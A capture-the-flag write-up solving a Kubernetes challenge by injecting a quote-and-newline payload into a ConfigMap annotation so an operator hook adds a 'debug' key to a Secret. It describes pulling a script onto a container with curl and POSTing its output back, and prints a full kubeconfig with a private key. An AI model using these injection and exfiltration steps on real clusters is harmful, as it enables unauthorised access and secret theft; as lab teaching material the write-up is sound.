LORE: Chapter 4: Uncle
======================================

## Task
Hi, TCC-CSIRT analyst,

do you know the feeling when, after a demanding shift, you fall into lucid dreaming and even in your sleep, you encounter tricky problems? Help a colleague solve tasks in the complex and interconnected world of LORE, where it is challenging to distinguish reality from fantasy.

The entry point to LORE is at http://intro.lore.tcc.

## Solution

So open the last application in this realm. We can find here some simple Python/Flask application. Ale hints is saying that we need to have solved previous challenges. So first thing, if we look on cgit interface from first challenge, it seems that we have source code for this application. Let's read it and show what app is doing. App has a small form with input for name and quota (which is selected from combo box). When you post this form, it create new ConfigMap in kubernetes API with random generated name. This name is saved in user session / cookie. If you open status page, ConfigMap is retrieved from kubernetes API and results is shown on the page. If you refresh page after a while, it can also show secret data (this magic will be explained further :-) ). Reset page deletes user session. ConfigMap remains in API but you can show it's data anymore.

First thing which we have to find out is... where is the flag. In all challenged it was in environment variables. We can see, that here is taken from environment variable to flask app config. Still not useful. But if you look on templates/status.html template, you can notice that if "debug" key is present in kubernetes secret data, app config will be printed on page. So that's the point, we probably have to somehow add this key to kubernetes secret.

Now the magic. If you use similar port scanner technic like in previous challenge, you find out opened port 9115 which is running Go HTTP server with profiling data (where you can waste a lot of time like me :-) ). But only interesting thing is that it's running shell-operator application. Which is just some application which connects to kubernetes API and you can write scripts which are executed on some events. This script is located in hooks directory so look on it in detail. This script is executed when ConfigMap is created or deleted in API. And all what it does is that it will create or delete corresponding secret. Creation is done using YAML string which is just as variable in python string and data are passed there using format function. Look very closely on it:

```
UPDATE_TEMPLATE = """
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: "{name}"
  namespace: "{queue_ns}"
data:
  storage: "{storage}"
---
apiVersion: v1
kind: Secret
metadata:
  name: "{name}"
  namespace: "{queue_ns}"
stringData:
  storage: "{storage}"
  access_token: "{access_token}"
  quota: "{quota}"
"""
```

Exactly here, in stringData, we need to add debug key to solve this challenge. And this script is just putting user input here. So, if we can put in quota any string, we can, like in SQL injection, create some other key. Bad news is that input in web application is validated and we can send in POST only those values which are in select list or it won't do anything. 

But look on rbac-devel.yml in kubernetes folder. There is role binding which allows user group devel to create and delete ConfigMaps. This is exactly what we need. So now all we need is some developer credentials to kubernetes API. Now you can spend hours of finding it... I've tried many things, stealing service account secrets from all containers... And the last resort was executing this command on jgames container:

```
find / -name "kube*" 
```

Note: in previous challenge I've said that you can't get command output from jdwp-shellifier. But you can write shell script with output redirection to /tmp. Download this script using curl on container, then run it and then again use curl to POST that file output back to your workstation.

This command reveals file /mnt/kubecreds-jacob.config. Nah, /mnt will be the probably very last folder where I look for some data... Developers... :-) So, download this file from container:

```
apiVersion: v1
clusters:
- cluster:
    certificate-authority-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURCVENDQWUyZ0F3SUJBZ0lJZmNPcWJvVVFTUDh3RFFZSktvWklodmNOQVFFTEJRQXdGVEVUTUJFR0ExVUUKQXhNS2EzVmlaWEp1WlhSbGN6QWVGdzB5TkRBNE1qVXhOVFF6TXpSYUZ3MHpOREE0TWpNeE5UUTRNelJhTUJVeApFekFSQmdOVkJBTVRDbXQxWW1WeWJtVjBaWE13Z2dFaU1BMEdDU3FHU0liM0RRRUJBUVVBQTRJQkR3QXdnZ0VLCkFvSUJBUURGSnovZndKL3pUUWY3WUxLYy9hb00rc25LanN2UnBDUUN0YkZzUTRJSmlWQ3pVV0lqbFE1eEJTME4KMHBTaFJDcUZySSsrb0RyVlZMS2NtUXlQQkVCVlliWG93MFhqZ2t5QU5LU3l3YWl4eno5QnloNXk0MElSTGw2Mgorbi8xSmkzVnBUMWFzZ3V5c0VOLzNQU1NiR2VkTVZ6bzJsV0xEdjAwZlQ1b2p1eGo5ZDJveFAwY0dZWDRobVFYCnBlTjhlRDhJQTIxYnNzamYza0ZwYVhrSjlJTDExd3Q0QjdjV2ZYNHNjYWdEZmJZSmlwUHd3VEZCWmZRRGlhMFoKbkgyUThtUTJ5ZEcvWHZtUFBFc1Z2dmJMYy9CdXk2REFVZnkvMzRZdXg4c1ZnUk5DamY1SmMwV09PVU5WNG05aAp3emQ3V2lOclo3MndGU3hlTjE0d0FUY0tXNFp2QWdNQkFBR2pXVEJYTUE0R0ExVWREd0VCL3dRRUF3SUNwREFQCkJnTlZIUk1CQWY4RUJUQURBUUgvTUIwR0ExVWREZ1FXQkJTdko1MkJLZDNsMkQwNXF1MmpxRHFCeFd1RjhEQVYKQmdOVkhSRUVEakFNZ2dwcmRXSmxjbTVsZEdWek1BMEdDU3FHU0liM0RRRUJDd1VBQTRJQkFRQWRZSUQ0OUhCaQp6U00rdVdtUVFaSkU4Z3I2UTJzejZQTHErbGVQQW9jL2Z5c0JZM1k1RVNSNjRSNkM1eU9VRnRGa2p0N29SZ2RzCkRqcVE2eUtweWd2R3J5dHdxQUZORisyRnN2WlpLUVovK09aZE1Ta3EvTWRDZCt2cXZqZW5LL0cvaWdaTzFzM2QKWEZaNmxWOGlOVFFvaXkrWEdOV3FLajNiTEoyQXRQR1lUS1kvejZjN2pETDB6RlZ3SFc0bVQ1NVBpQ3RXYThvbgo2R1lrZWhZaWNmK1ZWZzFZV0tsdUNWcnVPSTJQT2V2bCtGYXJFckkzeWsxVW5pcC9NNDU5dWpzMWgyQ1RrRlBhCndiM2JKMjZwellKSG5oc2dRTE1wd241a2JIQ2IxRU96UmlqRzJDaVdXdFM5eGtDN0taMU9kenFoZ29wQU16M3EKd3hlSncyLzlKWVV2Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K
    server: https://10.99.24.81:6443
  name: kubernetes
contexts:
- context:
    cluster: kubernetes
    user: jacob
  name: jacob@kubernetes
current-context: jacob@kubernetes
kind: Config
users:
- name: jacob
  user:
    client-certificate-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURKRENDQWd5Z0F3SUJBZ0lSQUtuQ3ZUSTVySGZJUHRYTU9xeURub2N3RFFZSktvWklodmNOQVFFTEJRQXcKRlRFVE1CRUdBMVVFQXhNS2EzVmlaWEp1WlhSbGN6QWVGdzB5TkRBNE1qVXhOVFE0TlRoYUZ3MHlOVEE0TWpVeApOVFE0TlRoYU1DNHhIREFNQmdOVkJBb1RCV1JsZG1Wc01Bd0dBMVVFQ2hNRmFtRmpiMkl4RGpBTUJnTlZCQU1UCkJXcGhZMjlpTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFrQlRqQjFUQzNDUEwKMHVMdU9CWTRKSGhuL2FUdU9uV1B0bysrSFUxN29KYUc2OHZSSHdjU28xY0VQNkJJVk4zd25TYTN2ZGpiVEVrVApnSjRGL2p2aFJLSk9laHdHWGRCWDJQV3ZFQm1IUkxOQmxuekltRnFscjNodXRMZFBIcC9lSlo5c0Y2ZXU3ZG5zCmhhL0M3eTlwbVl2UDRhTTBoYmVmL0lyNUhLdG8wR2JBOVpUbEhmZmI0dnlZSkFhdFdTRTYwTUNabGxQRDB2b2oKZjY4UVZNektHMmMzRDYzMTF4eThLR3ZHUzYxTUtaSG14aElDWE4rVFpKV1VWNkZIemxWWW14NVRYcFNmZTRXRQpOem1EWUsxU1RSdXhERDRnc09KMUVmNTJJQ2ZhNDRlZnBFdmNWSnhZNmhHc0hyMTRxWGYxQzUzKytrcFRTbWxzClJRdkx4eStqbHdJREFRQUJvMVl3VkRBT0JnTlZIUThCQWY4RUJBTUNCYUF3RXdZRFZSMGxCQXd3Q2dZSUt3WUIKQlFVSEF3SXdEQVlEVlIwVEFRSC9CQUl3QURBZkJnTlZIU01FR0RBV2dCU3ZKNTJCS2QzbDJEMDVxdTJqcURxQgp4V3VGOERBTkJna3Foa2lHOXcwQkFRc0ZBQU9DQVFFQXVZa2VySGdadmxkT2hZWkVBQmR5VjJ2VWUzMlRTckdXCktwbFJKaGJaaDZZU0RpOTB5UVovdWRNaVFERzVGcDV0YXVneWtkUUF4ZEw2U2dGL29lUmRHTHN3TnhZSzd4ZjQKTGtKeDM2RWtzb1FQZ3lUY1ZSRW9RQ2xnUjIwTFlSaFh2alg2ZE1BbDNHbzhEV01ORDNSa1laVGVCVFBkb0x2awpLUUt4VVQxcVplaklaei9QUko4UUt4bGhxZHV3TUY1bGNVbjM4QTl1S0J0S0FSak5JSUFXdDFXQzNHVmFIWnlNCkc5V2RSUnNQRWdFeFc1MnRSN2NUZlBtWENsU3YvU21OdVFjVWhvWk04TFNzcHZUTTNmN2dwVmFuWDdTTEZvL2YKWkVGem8rWnBwd3Y5VTF6T3ArY2c5R2lCaWxldHJUbjZtektQd2dKbzRsT3h6OXpDRTFBdFVBPT0KLS0tLS1FTkQgQ0VSVElGSUNBVEUtLS0tLQo=
    client-key-data: LS0tLS1CRUdJTiBQUklWQVRFIEtFWS0tLS0tCk1JSUV2QUlCQURBTkJna3Foa2lHOXcwQkFRRUZBQVNDQktZd2dnU2lBZ0VBQW9JQkFRQ1FGT01IVk1MY0k4dlMKNHU0NEZqZ2tlR2Y5cE80NmRZKzJqNzRkVFh1Z2xvYnJ5OUVmQnhLalZ3US9vRWhVM2ZDZEpyZTkyTnRNU1JPQQpuZ1grTytGRW9rNTZIQVpkMEZmWTlhOFFHWWRFczBHV2ZNaVlXcVd2ZUc2MHQwOGVuOTRsbjJ3WHA2N3QyZXlGCnI4THZMMm1aaTgvaG96U0Z0NS84aXZrY3EyalFac0QxbE9VZDk5dmkvSmdrQnExWklUclF3Sm1XVThQUytpTi8KcnhCVXpNb2JaemNQcmZYWEhMd29hOFpMclV3cGtlYkdFZ0pjMzVOa2xaUlhvVWZPVlZpYkhsTmVsSjk3aFlRMwpPWU5nclZKTkc3RU1QaUN3NG5VUi9uWWdKOXJqaDUra1M5eFVuRmpxRWF3ZXZYaXBkL1VMbmY3NlNsTkthV3hGCkM4dkhMNk9YQWdNQkFBRUNnZ0VBQnlKUm4zSk45N0o2RENZYVg0S1NJeFFuS2dMNW5NRm5iVVd1eHlxbi9XcVcKb2FSRTVZRm5KZGxRSjRwYktvQ1d3bUZCWmRBUUE3WDJsajY4MHpySnk2a3hzNUFockpGOVdBdktNRVRqVXI2QgpkOThUMjU5Wlp0ZlN1M1g4SCtzUWg5SmQrc25kdW44NDIrRzVDRGpUeEx1TWZvS2pQaCs2ZHptMlhmb0t4WTdOCjVVd0RPdURHYjNmVXhsZDJZcSswUCtxWUdxcjZUWjY5aUZZMVNERHQxdkV6dUhDcHJmeDlyZk0wbjdXdDU5SmoKSmwxVWpDeXU1elhSbU9sZ0xUK3NLdUdBOUlGTGRRcTF2Zi9zSFczZFZ2Ykpnam5FN2dpR2ZvYTlTMDc0TzFibgpocEFBaU9wNEVGalFoaXkzV1d3L2lpdXliRkRlbkFhcC9rZHJyWm9xS1FLQmdRREcxWENoYnlWSGRTL3FMVUhNCmdMV280dW9XY1lUTXJNdm1RamxHelhYWHR0UWdEdCtZd1JXTnFKdFJrQkc0dkVabDJ1cXdUeDlleDRwUFdSSXAKL1pPd2JnNVBmNE1GZkc0K0dZeU83YlVxVGRLU0tNa1Y1eEszUFU0VGtoanpCR042dFpQNDUxZDV4azN5TUFpdwpyV2FEdk05SHhDS2tTZkRRbFRCY3hCcDA5UUtCZ1FDNWdaUXJLQk8zL1VmUEFXYUw4b2FpY25jaHhhanhRNXAzCkQ1RDBwbndhRmNKemFZcm5GK2h3ejcxUnRreFNPVWh0Mkx2MUZLeksxRjVIRVJtNFpFczFsVTJRRHl3Y25OdmkKNVByUGxGZDViUU12c1BIK0dqNTJXaE1YWGs4QVRhZjdLWnVqUzVVYTM5bHViMXVYN2VaSzJ1WUZPN3V3TVlUKwpFV21FM09sKzJ3S0JnQy9EVC9ZSG0vM3BZYVF3VVBFT0xoVXV4U3ExQkVDaWRheVBWZkR6SkE2NGhZWlo3RTVtCmU0WDI3YkNQR2lLMVgzZlNPYlEybllPSURXcDRMQXZZTlNVWm11aHY2Z3BrVkpzb1NnSi9pWmhxNzExYTNNc2QKSWZyUWlEUGRVWTczQytxTE9jdDl6eDZhaTFqVlB4RXA1a2xaRHJYZm9LNjBjRnU2cXM1dDhTa05Bb0dBWmxtZgpKWnlNSEtTclBRUjV6dGMxLzJVR1krVEp6S3ZQQ3NmVTQ1Y0R1K1NyajcvNHVuNVBhZ2JFWHRRbEVleTNFSnhYClArWnpXOG1HWnRHQmptSVB1UFd5Z0x4T1MwOGtadkNOallBOEx5dTlhVS9JaExsNEl4YVpsL2dad0lJWUg1U2EKWWFOdkZnL1J5SU82Vm40VTVOSVh2V1Z5cmNqMHByVjJzYTZ0U2FjQ2dZQnBKb1UvYzc1NVFTQi9uTVNpUmxuRQpUVkJsWkIvMkExL01pYzJoU2syVXJuajhUN0dIZmM1TEp0VmNNZEJyS1h4ckE5OXNEUHFwclB2UzcyVkl0VE9ZCitsckdmYVh0bUtpUDFXUnVXNllpTUFScTBBM1Q1SVdacTBlRlVYNCthNVdvK0N1d2pUNmp5V3lrM0doVUNQUFIKWnZQL2REdmRmRTBOVm1HT0phaFltdz09Ci0tLS0tRU5EIFBSSVZBVEUgS0VZLS0tLS0K
```

We can see that it's kubernetes client config and it connects to IP address that we can reach with VPN so we do not need tunelling things anymore. Just install kubernetes client on workstation and save this file as ~/.kube/config.

And now it's very easy. Create some project in app. Notice txid (in my case 257dc400cc2f2bfea550f725d229e1cd) and delete ConfigMap using kubectl:

```
kubectl delete configmap request-257dc400cc2f2bfea550f725d229e1cd -n sam-queue
```

Refresh status page in browser, ConfigMap and secret should be gone.

Now prepare YAML template in map.yml:

```
apiVersion: v1
kind: ConfigMap
metadata:
  name: request-257dc400cc2f2bfea550f725d229e1cd
  namespace: sam-queue
  annotations:
    sam-operator/project_name: nah
    sam-operator/project_quota: "1GB\"\n  debug: \"1"
data:
  name: nah
  quota: "1GB"
```

and create it again:

```
kubectl create -f map.yaml
```

Refresh page in web browser and enjoy the flag: FLAG{nP0c-X9Gh-bee7-iWxw}